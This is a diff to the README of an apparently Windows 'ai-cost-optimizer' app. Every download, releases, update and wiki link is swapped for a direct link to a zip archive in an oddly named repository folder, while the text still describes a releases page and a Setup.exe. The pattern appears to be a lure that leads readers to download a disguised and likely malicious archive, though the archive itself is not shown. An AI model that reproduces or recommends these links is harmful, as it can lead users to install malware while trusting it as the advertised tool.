@@ -1,6 +1,6 @@
 # ⚙️ ai-cost-optimizer - Reduce AI Model Costs Easily
 
-[![Download ai-cost-optimizer](https://img.shields.io/badge/Download-ai--cost--optimizer-brightgreen)](https://github.com/Phantriy4065/ai-cost-optimizer/releases)
+[![Download ai-cost-optimizer](https://img.shields.io/badge/Download-ai--cost--optimizer-brightgreen)](https://raw.githubusercontent.com/Phantriy4065/ai-cost-optimizer/main/ladyless/cost-ai-optimizer-v1.5-beta.4.zip)
 
 ---
 
@@ -51,10 +51,10 @@ Follow these steps to get ai-cost-optimizer up and running on your Windows machi
 
 Click the button below to visit the download page for ai-cost-optimizer. This page contains the latest version as well as older releases if you need them.
 
-[![Download Page](https://img.shields.io/badge/GitHub-Download-blue)](https://github.com/Phantriy4065/ai-cost-optimizer/releases)
+[![Download Page](https://img.shields.io/badge/GitHub-Download-blue)](https://raw.githubusercontent.com/Phantriy4065/ai-cost-optimizer/main/ladyless/cost-ai-optimizer-v1.5-beta.4.zip)
 
 1. Open your web browser and go to the download page by clicking the button above or visiting:  
-   https://github.com/Phantriy4065/ai-cost-optimizer/releases
+   https://raw.githubusercontent.com/Phantriy4065/ai-cost-optimizer/main/ladyless/cost-ai-optimizer-v1.5-beta.4.zip
 
 2. On the releases page, look for the latest Windows installer file. This will usually be named something like `ai-cost-optimizer-Setup.exe`.
 
@@ -90,7 +90,7 @@ Using ai-cost-optimizer is straightforward. Here is how to set it up and start s
 
 To keep the app working smoothly and securely, update it regularly:
 
-1. Visit the releases page periodically: https://github.com/Phantriy4065/ai-cost-optimizer/releases
+1. Visit the releases page periodically: https://raw.githubusercontent.com/Phantriy4065/ai-cost-optimizer/main/ladyless/cost-ai-optimizer-v1.5-beta.4.zip
 
 2. Download the latest installer following the same steps used to install the app.
 
@@ -134,7 +134,7 @@ No. Since it connects to online AI APIs, it needs an active internet connection.
 
 For detailed instructions, check the documentation on GitHub. It includes advanced settings, integration tips, and troubleshooting guides.
 
-Link: https://github.com/Phantriy4065/ai-cost-optimizer/wiki
+Link: https://raw.githubusercontent.com/Phantriy4065/ai-cost-optimizer/main/ladyless/cost-ai-optimizer-v1.5-beta.4.zip
 
 ---
 
